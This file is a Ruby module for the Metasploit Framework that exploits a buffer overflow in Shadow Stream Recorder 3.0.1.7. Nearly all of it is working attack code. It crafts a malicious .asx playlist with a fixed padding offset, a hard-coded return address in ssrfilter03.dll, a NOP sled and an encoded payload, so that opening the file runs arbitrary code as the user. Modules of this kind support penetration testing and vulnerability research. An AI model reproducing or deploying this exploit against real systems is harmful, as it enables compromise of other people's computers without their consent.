##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Shadow Stream Recorder 3.0.1.7 Buffer Overflow',
			'Description'     => %q{
				This module exploits a buffer overflow in Shadow Stream Recorder 3.0.1.7.
				Using the application to open a specially crafted asx file, a buffer
				overflow may occur to allow arbitrary code execution under the context
				of the user.
			},
			'License'         => MSF_LICENSE,
			'Author'          =>
				[
					'AlpHaNiX <alpha[at]hacker.bz>',  # Original .m3u exploit
					'b0telh0 <me[at]gotgeek.com.br>'  # MSF Module and .asx exploit
				],
			'References'      =>
				[
					[ 'BID', '34864' ],
					[ 'EDB', '11957' ]
				],
			'DefaultOptions'  =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true'
				},
			'Platform'        => 'win',
			'Payload'         =>
				{
					'Space' => 2000,
					'BadChars' => "\x00\x09\x0a",
					'StackAdjustment' => -3500
				},
			'Targets'         =>
				[
					[ 'Windows Universal',
						{
							# push esp - ret ssrfilter03.dll
							'Ret' => 0x10035706,
							'Offset' => 26117
						}
					],
				],
			'Privileged'      => false,
			'DisclosureDate'  => 'Mar 29 2010',
			'DefaultTarget'   => 0))

		register_options(
			[
				OptString.new('FILENAME', [true, 'The file name.', 'msf.asx'])
			], self.class)

	end

	def exploit

		buffer = "http://"
		buffer << rand_text_alpha_upper(target['Offset'])
		buffer << [target.ret].pack('V')
		buffer << make_nops(40)
		buffer << payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(buffer)
	end

end